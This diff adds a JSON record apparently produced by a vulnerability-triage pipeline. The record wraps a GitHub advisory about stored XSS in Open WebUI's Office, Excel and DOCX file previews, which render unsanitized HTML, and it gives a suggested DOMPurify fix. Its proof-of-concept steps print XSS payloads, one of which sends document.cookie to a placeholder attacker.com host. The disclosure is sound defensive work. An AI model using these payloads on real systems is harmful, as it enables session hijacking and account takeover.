@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/16376469?v=4\", \"events_url\": \"https://api.github.com/users/foodlook/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/foodlook/followers\", \"following_url\": \"https://api.github.com/users/foodlook/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/foodlook/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/foodlook\", \"id\": 16376469, \"login\": \"foodlook\", \"node_id\": \"MDQ6VXNlcjE2Mzc2NDY5\", \"organizations_url\": \"https://api.github.com/users/foodlook/orgs\", \"received_events_url\": \"https://api.github.com/users/foodlook/received_events\", \"repos_url\": \"https://api.github.com/users/foodlook/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/foodlook/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/foodlook/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/foodlook\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45318\", \"cvss\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"## Related advisory\\n\\nThis advisory tracks a regression of the original Excel-preview XSS that was \\npublicly disclosed and patched under [GHSA-jwf8-pv5p-vhmc](https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc) \\n(patched in v0.8.0). The same root cause — `XLSX.utils.sheet_to_html()` output \\nrendered via `{@html excelHtml}` without DOMPurify — was reintroduced sometime \\nafter v0.8.0 and is exploitable again as of v0.8.12 and through the version \\nrange listed above. This advisory additionally covers the related \\n`fileOfficeHtml` sink in `src/lib/components/chat/FileNav.svelte` \\n(lines 458 and 1285) which was not part of the jwf8 advisory's scope.\\n\\n## Summary\\n\\nOpen WebUI renders user-uploaded Office files (Excel, DOCX) as HTML using Svelte's `{@html}` directive **without DOMPurify sanitization**. While the codebase has DOMPurify available and uses it in 9 out of 23 `{@html}` locations (39%), three file-preview rendering paths bypass it entirely, allowing Stored XSS when a user uploads a malicious document.\\n\\nThis is a classic **defense propagation failure**: the sanitization primitive exists in the codebase but is not consistently applied to all rendering surfaces.\\n\\n## Root Cause\\n\\n**The defense primitive exists**: `DOMPurify.sanitize()` is imported and used in components like `General.svelte`, `MarkdownInlineTokens.svelte`, `Banner.svelte`, and `SVGPanZoom.svelte`.\\n\\n**But 3 file-preview paths skip it**:\\n\\n### Occurrence 1: FilePreview.svelte — Office HTML\\n\\n**File**: `src/lib/components/chat/FileNav/FilePreview.svelte` line 324\\n\\n```svelte\\n{:else if fileOfficeHtml !== null}\\n    <div class=\\\"office-preview overflow-auto flex-1 min-h-0\\\">\\n        {@html fileOfficeHtml}   <!-- NO DOMPurify! -->\\n    </div>\\n```\\n\\n`fileOfficeHtml` is generated from user-uploaded Office files (PPT, DOC, etc.) converted to HTML. The HTML is rendered directly without sanitization.\\n\\n### Occurrence 2: FileItemModal.svelte — Excel HTML\\n\\n**File**: `src/lib/components/common/FileItemModal.svelte` line 560\\n\\n```svelte\\n{@html excelHtml}   <!-- NO DOMPurify! -->\\n```\\n\\n`excelHtml` is generated from user-uploaded Excel files converted to HTML tables. No sanitization applied.\\n\\n### Occurrence 3: FileItemModal.svelte — DOCX HTML\\n\\n**File**: `src/lib/components/common/FileItemModal.svelte` line 590\\n\\n```svelte\\n{@html docxHtml}   <!-- NO DOMPurify! -->\\n```\\n\\n`docxHtml` is generated from user-uploaded DOCX files converted to HTML. No sanitization applied.\\n\\n## Contrast with Sanitized Paths\\n\\nFor comparison, the same codebase correctly sanitizes in other locations:\\n\\n```svelte\\n<!-- MarkdownInlineTokens.svelte:130 — SAFE -->\\n{@html DOMPurify.sanitize(token.text, { ADD_ATTR: ['target'] })}\\n\\n<!-- General.svelte:276 — SAFE -->\\n{@html DOMPurify.sanitize($config?.license_metadata?.html)}\\n\\n<!-- Banner.svelte:103 — SAFE -->\\n{@html DOMPurify.sanitize(marked.parse(...))}\\n```\\n\\n## Defense Propagation Gap\\n\\n| Metric | Value |\\n|--------|-------|\\n| Total `{@html}` usages | 23 |\\n| With DOMPurify | 9 (39%) |\\n| **Without DOMPurify** | **14 (61%)** |\\n| Confirmed exploitable (file preview) | **3** |\\n\\nThe remaining 11 unsanitized `{@html}` usages include syntax highlighting (`hljs`), KaTeX math rendering, and `marked.parse()` with `sanitizeResponseContent()` pre-processing — these have varying levels of inherent safety but still represent inconsistent defense application.\\n\\n## Tested Version\\n\\n- Open WebUI v0.8.12 (commit `9bd8425`, tag `v0.8.12`)\\n\\n## Steps to Reproduce\\n\\n### PoC 1: Malicious Excel File\\n\\n1. Create a `.xlsx` file with a cell containing:\\n   ```\\n   <img src=x onerror=\\\"alert(document.cookie)\\\">\\n   ```\\n   (Using a library like openpyxl to inject raw HTML into cell values)\\n\\n2. Upload the file to Open WebUI via the chat file upload\\n\\n3. When any user previews the file → `excelHtml` renders the injected HTML → **XSS fires**\\n\\n### PoC 2: Malicious DOCX File\\n\\n1. Create a `.docx` file with embedded HTML:\\n   ```xml\\n   <w:r><w:t><![CDATA[<svg onload=\\\"fetch('https://attacker.com/steal?c='+document.cookie)\\\">]]></w:t></w:r>\\n   ```\\n\\n2. Upload to Open WebUI\\n\\n3. File preview renders `docxHtml` → **XSS fires**\\n\\n### PoC 3: Verify Rendering Path\\n\\n```javascript\\n// In browser devtools on Open WebUI, after uploading a file:\\n// The file preview component renders:\\n//   FileItemModal → {@html excelHtml}  // no DOMPurify\\n//   FileItemModal → {@html docxHtml}   // no DOMPurify\\n//   FilePreview   → {@html fileOfficeHtml}  // no DOMPurify\\n\\n// Compare with safe path:\\n//   NotebookView → {@html DOMPurify.sanitize(toStr(output.data['text/html']))}  // sanitized!\\n```\\n\\n## Impact\\n\\n- **Stored XSS** — malicious file is stored server-side, XSS fires for every user who previews it\\n- **Session hijacking** via `document.cookie` theft\\n- **Account takeover** — attacker can perform actions as the victim user\\n- **Data exfiltration** — read chat history, API keys, uploaded documents\\n- **Multi-user environments** — shared Open WebUI instances are especially vulnerable (one malicious upload affects all viewers)\\n- **Defense propagation failure** — DOMPurify is available and used elsewhere, but not applied to file preview paths\\n\\n## Suggested Remediation\\n\\nApply DOMPurify to all three file preview paths:\\n\\n```svelte\\n<!-- FilePreview.svelte:324 — FIX -->\\n{@html DOMPurify.sanitize(fileOfficeHtml)}\\n\\n<!-- FileItemModal.svelte:560 — FIX -->\\n{@html DOMPurify.sanitize(excelHtml)}\\n\\n<!-- FileItemModal.svelte:590 — FIX -->\\n{@html DOMPurify.sanitize(docxHtml)}\\n```\\n\\nAlternatively, adopt a **defense-by-default pattern**: create a wrapper component that always applies DOMPurify, making unsanitized `{@html}` usage a code review flag.\\n\\n## References\\n\\n- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)\\n- OWASP XSS Prevention Cheat Sheet\\n- GHSA-x75g-rp99-qqpx: Previous Open WebUI report (DNS rebinding TOCTOU, different vulnerability class)\", \"epss\": {\"percentage\": 0.00209, \"percentile\": 0.11041}, \"ghsa_id\": \"GHSA-hcwp-82g6-8wxc\", \"github_reviewed_at\": \"2026-05-14T20:18:27Z\", \"html_url\": \"https://github.com/advisories/GHSA-hcwp-82g6-8wxc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hcwp-82g6-8wxc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45318\"}], \"nvd_published_at\": \"2026-05-15T22:16:54Z\", \"published_at\": \"2026-05-14T20:18:27Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-hcwp-82g6-8wxc\", \"https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc\", \"https://github.com/open-webui/open-webui/releases/tag/v0.9.3\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45318\", \"https://github.com/advisories/GHSA-hcwp-82g6-8wxc\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-hcwp-82g6-8wxc\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI has stored XSS via unsanitized Office/Excel/DOCX file preview rendering ({@html} without DOMPurify)\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-19T15:58:49Z\", \"url\": \"https://api.github.com/advisories/GHSA-hcwp-82g6-8wxc\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.3\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.9.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hcwp-82g6-8wxc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: <= 0.9.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45318"
+    ],
+    "cvss_score": 5.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.738592Z",
+  "provenance": {
+    "content_sha256": "056276eadfbb012a65229856c7403d95c9a7e7bd9e516265f45d1a9ecc6b511b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-14T20:18:27Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hcwp-82g6-8wxc",
+  "status": "active",
+  "title": "Open WebUI has stored XSS via unsanitized Office/Excel/DOCX file preview rendering ({@html} without DOMPurify)",
+  "updated_at": "2026-05-19T15:58:49Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hcwp-82g6-8wxc"
+}
